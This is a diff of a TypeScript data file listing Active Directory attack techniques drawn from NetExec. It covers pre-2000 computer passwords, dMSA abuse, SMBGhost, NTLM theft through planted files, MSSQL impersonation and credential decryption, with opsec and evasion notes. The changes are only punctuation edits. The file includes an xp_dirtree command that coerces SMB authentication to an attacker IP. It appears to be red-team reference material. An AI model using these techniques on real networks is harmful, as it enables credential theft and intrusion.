@@ -7,7 +7,7 @@ const mitre = (id: string): { id: string; url: string } => ({
 });
 
 /**
- * Gaps found auditing against NetExec (nxc) — its wiki and module set. Each is a
+ * Gaps found auditing against NetExec (nxc): its wiki and module set. Each is a
  * technique/vector (NetExec is one of the tools). Web-verified; wired into the
  * existing categories with a forward continuation so none dead-ends.
  */
@@ -18,7 +18,7 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     phase: 'initial-access',
     summary: "Pre-staged computer accounts keep a predictable password (lowercased name) until first boot.",
     description:
-      "A computer account pre-created with the 'pre-Windows 2000' flag gets an initial password equal to its own name in lowercase (e.g. WS01$ -> 'ws01'), truncated to 14 chars. Until that machine first boots and rotates its password, anyone who can enumerate these stale objects (WORKSTATION_TRUST_ACCOUNT with logonCount 0 / low pwdLastSet) can authenticate as the computer and request a TGT — a quiet foothold for further enumeration and delegation abuse.",
+      "A computer account pre-created with the 'pre-Windows 2000' flag gets an initial password equal to its own name in lowercase (e.g. WS01$ -> 'ws01'), truncated to 14 chars. Until that machine first boots and rotates its password, anyone who can enumerate these stale objects (WORKSTATION_TRUST_ACCOUNT with logonCount 0 / low pwdLastSet) can authenticate as the computer and request a TGT, a quiet foothold for further enumeration and delegation abuse.",
     tools: [
       { name: 'NetExec (pre2k)', url: 'https://www.netexec.wiki/ldap-protocol/pre2k' },
       { name: 'pre2k (garrettfoster13)', url: 'https://github.com/garrettfoster13/pre2k' },
@@ -29,8 +29,8 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     mitre: mitre('T1078.002'),
     references: [
-      { label: 'NetExec Wiki — Pre2k', url: 'https://www.netexec.wiki/ldap-protocol/pre2k' },
-      { label: 'The Hacker Recipes — Pre-Windows 2000 computers', url: 'https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers' },
+      { label: 'NetExec Wiki, Pre2k', url: 'https://www.netexec.wiki/ldap-protocol/pre2k' },
+      { label: 'The Hacker Recipes, Pre-Windows 2000 computers', url: 'https://www.thehacker.recipes/ad/movement/builtins/pre-windows-2000-computers' },
     ],
     requires: ['Ability to enumerate domain objects (any account; sometimes anonymous)', 'A pre-staged computer object that has never logged on'],
     opsec: 'Spray-like Kerberos pre-auth failures (4771) across many computer names are detectable; a successful logon as a dormant machine account is anomalous. Quiet compared to most footholds.',
@@ -42,7 +42,7 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     phase: 'priv-esc',
     summary: 'Abuse delegated Managed Service Accounts on Server 2025 to inherit a target principal’s SIDs.',
     description:
-      "Windows Server 2025 adds delegated Managed Service Accounts (dMSAs) with a migration mechanism. With CreateChild on any OU (or write over a dMSA), an attacker points msDS-ManagedAccountPrecededByLink at a target — e.g. a Domain Admin — and flips msDS-DelegatedMSAState. The KDC then mints the dMSA a PAC carrying the target's SIDs, succeeding the victim without touching their group membership or password. A single Server 2025 DC makes it viable (CVE-2025-53779).",
+      "Windows Server 2025 adds delegated Managed Service Accounts (dMSAs) with a migration mechanism. With CreateChild on any OU (or write over a dMSA), an attacker points msDS-ManagedAccountPrecededByLink at a target (e.g. a Domain Admin) and flips msDS-DelegatedMSAState. The KDC then mints the dMSA a PAC carrying the target's SIDs, succeeding the victim without touching their group membership or password. A single Server 2025 DC makes it viable (CVE-2025-53779).",
     tools: [
       { name: 'NetExec (badsuccessor)', url: 'https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py' },
       { name: 'SharpSuccessor', url: 'https://github.com/logangoins/SharpSuccessor' },
@@ -55,8 +55,8 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     mitre: mitre('T1078.002'),
     references: [
-      { label: 'Akamai — BadSuccessor: Abusing dMSA', url: 'https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory' },
-      { label: 'Unit 42 — Exploiting Delegated MSAs', url: 'https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/' },
+      { label: 'Akamai, BadSuccessor: Abusing dMSA', url: 'https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory' },
+      { label: 'Unit 42, Exploiting Delegated MSAs', url: 'https://unit42.paloaltonetworks.com/badsuccessor-attack-vector/' },
     ],
     requires: ['CreateChild on an OU, or write over a dMSA object', 'At least one Windows Server 2025 Domain Controller'],
     opsec: 'New dMSA objects and changes to msDS-ManagedAccountPrecededByLink / msDS-DelegatedMSAState are high-signal once detections exist (4662/5136). Stealthy where dMSA auditing is absent.',
@@ -78,11 +78,11 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     mitre: mitre('T1210'),
     references: [
-      { label: 'NVD — CVE-2020-0796', url: 'https://nvd.nist.gov/vuln/detail/cve-2020-0796' },
+      { label: 'NVD, CVE-2020-0796', url: 'https://nvd.nist.gov/vuln/detail/cve-2020-0796' },
       { label: 'NetExec module (smbghost.py)', url: 'https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/smbghost.py' },
     ],
     requires: ['Network access to TCP/445 on an unpatched Win10 / Server 1903-1909 host'],
-    opsec: 'The kernel exploit is crash-prone (BSOD on failure) and loud; the vuln check itself is a benign protocol negotiation. Patched everywhere current — legacy-host only.',
+    opsec: 'The kernel exploit is crash-prone (BSOD on failure) and loud; the vuln check itself is a benign protocol negotiation. Patched everywhere current, so legacy-host only.',
     difficulty: 'hard',
   },
   {
@@ -104,8 +104,8 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     mitre: mitre('T1552.001'),
     references: [
-      { label: 'NetExec Wiki — Spidering Shares', url: 'https://www.netexec.wiki/smb-protocol/spidering-shares' },
-      { label: 'The Hacker Recipes — Network shares', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/network-shares' },
+      { label: 'NetExec Wiki, Spidering Shares', url: 'https://www.netexec.wiki/smb-protocol/spidering-shares' },
+      { label: 'The Hacker Recipes, Network shares', url: 'https://www.thehacker.recipes/ad/movement/credentials/dumping/network-shares' },
     ],
     requires: ['Any domain credentials with read access to one or more shares'],
     opsec: 'Mass file reads generate object-access events (5145) and are noisy at scale; targeted pattern searches are quieter.',
@@ -116,7 +116,7 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     label: 'NTLM Theft via Malicious Files',
     phase: 'credential-access',
     summary: 'Plant LNK/SCF/.searchConnector-ms files on writable shares so browsing users leak NetNTLM.',
-    description: r`With write access to a frequented share, drop files whose icon/resource path points at an attacker UNC (\\attacker\share). When a user merely browses the folder in Explorer, Windows resolves the icon and authenticates to the attacker host, leaking the user's NetNTLMv2 — to crack offline or relay. NetExec automates planting across writable shares (slinky=.lnk, scuffy=.scf, drop-sc=.searchConnector-ms, drop-library-ms=.library-ms / CVE-2025-24054); pair with Responder/ntlmrelayx.`,
+    description: r`With write access to a frequented share, drop files whose icon/resource path points at an attacker UNC (\\attacker\share). When a user merely browses the folder in Explorer, Windows resolves the icon and authenticates to the attacker host, leaking the user's NetNTLMv2 to crack offline or relay. NetExec automates planting across writable shares (slinky=.lnk, scuffy=.scf, drop-sc=.searchConnector-ms, drop-library-ms=.library-ms / CVE-2025-24054); pair with Responder/ntlmrelayx.`,
     tools: [
       { name: 'NetExec (slinky / scuffy / drop-sc)', url: 'https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/slinky.py' },
       { name: 'ntlm_theft', url: 'https://github.com/Greenwolf/ntlm_theft' },
@@ -129,11 +129,11 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     mitre: mitre('T1187'),
     references: [
-      { label: 'Secure Ideas — NetExec SMB Slinky', url: 'https://www.secureideas.com/blog/no-broadcast-traffic-no-problem-netexec-smb-slinky-module' },
-      { label: 'The Hacker Recipes — Living off the land', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land' },
+      { label: 'Secure Ideas, NetExec SMB Slinky', url: 'https://www.secureideas.com/blog/no-broadcast-traffic-no-problem-netexec-smb-slinky-module' },
+      { label: 'The Hacker Recipes, Living off the land', url: 'https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/living-off-the-land' },
     ],
     requires: ['Write access to a share that users browse', 'A listener (Responder / ntlmrelayx) to catch the auth'],
-    opsec: 'Passive trap — depends on a victim browsing the folder, but very stealthy to plant. The captured auth (then crack or relay) is the higher-signal follow-on. Remember CLEANUP.',
+    opsec: 'Passive trap: it depends on a victim browsing the folder, but is very stealthy to plant. The captured auth (then crack or relay) is the higher-signal follow-on. Remember CLEANUP.',
     difficulty: 'easy',
   },
   {
@@ -142,7 +142,7 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     phase: 'priv-esc',
     summary: 'Abuse EXECUTE AS / IMPERSONATE grants to climb from a low-priv login to sysadmin (sa).',
     description:
-      'SQL Server logins are often granted IMPERSONATE on higher-privileged principals (or db-chaining lets you EXECUTE AS another user). Enumerate who you can impersonate; if a path reaches a sysadmin, assume that context and you own the instance — then xp_cmdshell to SYSTEM on the host, or pivot via linked servers.',
+      'SQL Server logins are often granted IMPERSONATE on higher-privileged principals (or db-chaining lets you EXECUTE AS another user). Enumerate who you can impersonate; if a path reaches a sysadmin, assume that context and you own the instance; then xp_cmdshell to SYSTEM on the host, or pivot via linked servers.',
     tools: [
       { name: 'NetExec (mssql_priv)', url: 'https://www.netexec.wiki/mssql-protocol/mssql-privesc' },
       { name: 'mssqlclient (Impacket)', url: 'https://github.com/fortra/impacket' },
@@ -154,9 +154,9 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     mitre: mitre('T1078'),
     references: [
-      { label: 'HackTricks — Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' },
-      { label: 'NetExec Wiki — MSSQL PrivEsc', url: 'https://www.netexec.wiki/mssql-protocol/mssql-privesc' },
-      { label: 'HackTricks — Abusing AD MSSQL', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/abusing-ad-mssql.html' },
+      { label: 'HackTricks, Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' },
+      { label: 'NetExec Wiki, MSSQL PrivEsc', url: 'https://www.netexec.wiki/mssql-protocol/mssql-privesc' },
+      { label: 'HackTricks, Abusing AD MSSQL', url: 'https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/abusing-ad-mssql.html' },
     ],
     requires: ['A valid SQL login (SQL or Windows auth) with IMPERSONATE / EXECUTE AS grants'],
     opsec: 'Impersonation and xp_cmdshell enablement are auditable SQL events; xp_cmdshell to SYSTEM is the loud part.',
@@ -166,7 +166,7 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     id: 'app-config-secrets',
     label: 'Stored App Credential Extraction',
     phase: 'credential-access',
-    summary: 'Decrypt creds saved by admin tooling — mRemoteNG, Veeam, PuTTY, WinSCP, RDCMan.',
+    summary: 'Decrypt creds saved by admin tooling: mRemoteNG, Veeam, PuTTY, WinSCP, RDCMan.',
     description:
       'Admin workstations and jump boxes hoard reusable credentials inside connection-manager and backup tooling. mRemoteNG stores confCons.xml under a known static key (trivially decrypted); Veeam keeps backup-job creds in a local DB recoverable with admin rights; PuTTY/WinSCP/RDCMan/MobaXterm cache session secrets in the registry or profile files. These often yield service or domain-admin creds.',
     tools: [
@@ -179,8 +179,8 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     ],
     mitre: mitre('T1555.005'),
     references: [
-      { label: 'NetExec Wiki — Dump mRemoteNG', url: 'https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-mremoteng' },
-      { label: 'NetExec Wiki — Dump Veeam', url: 'https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-veeam' },
+      { label: 'NetExec Wiki, Dump mRemoteNG', url: 'https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-mremoteng' },
+      { label: 'NetExec Wiki, Dump Veeam', url: 'https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-veeam' },
     ],
     requires: ['Local admin / SYSTEM on the host holding the app config (some app files are user-readable)'],
     opsec: 'Reading config files / the Veeam DB is far quieter than touching LSASS and bypasses EDR LSASS focus. High-yield against admin jump boxes.',
@@ -192,7 +192,7 @@ export const adNetexecNodes: TechniqueNodeDef[] = [
     phase: 'credential-access',
     summary: 'Make the SQL service authenticate to you via xp_dirtree.',
     description:
-      "Any MSSQL login — even a low-privileged one — can call xp_dirtree, xp_fileexist or xp_subdirs against an attacker UNC path (\\\\attacker\\share), forcing the SQL Server service account to authenticate over SMB. Capture the NetNTLM to crack offline, or relay it (to LDAP for RBCD, to ADCS, or to another SQL host). A quiet way to turn read-only database access into the service account's credentials — these are stored procedures enabled by default that need no elevated role.",
+      "Any MSSQL login, even a low-privileged one, can call xp_dirtree, xp_fileexist or xp_subdirs against an attacker UNC path (\\\\attacker\\share), forcing the SQL Server service account to authenticate over SMB. Capture the NetNTLM to crack offline, or relay it (to LDAP for RBCD, to ADCS, or to another SQL host). A quiet way to turn read-only database access into the service account's credentials. These are stored procedures enabled by default that need no elevated role.",
     tools: [
       { name: 'mssqlclient (Impacket)', url: 'https://github.com/fortra/impacket' },
       { name: 'NetExec (mssql)', url: 'https://github.com/Pennyw0rth/NetExec' },
@@ -205,10 +205,10 @@ SQL> EXEC master..xp_dirtree '\\10.0.0.66\share',1,1`, lang: 'bash' },
     ],
     requires: ['Any MSSQL login (sysadmin not required)', 'A listener (Responder / ntlmrelayx) to catch the auth', 'MSSQL (1433) reachable'],
     mitre: mitre('T1187'),
-    opsec: 'xp_dirtree is enabled by default and needs no elevated role — very low-friction. The outbound SMB from the SQL host to an unusual IP is the main signal; have your capture/relay listener running first.',
+    opsec: 'xp_dirtree is enabled by default and needs no elevated role: very low-friction. The outbound SMB from the SQL host to an unusual IP is the main signal; have your capture/relay listener running first.',
     difficulty: 'easy',
     references: [
-      { label: 'HackTricks — Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' },
+      { label: 'HackTricks, Pentesting MSSQL', url: 'https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html' },
     ],
   },
 ];
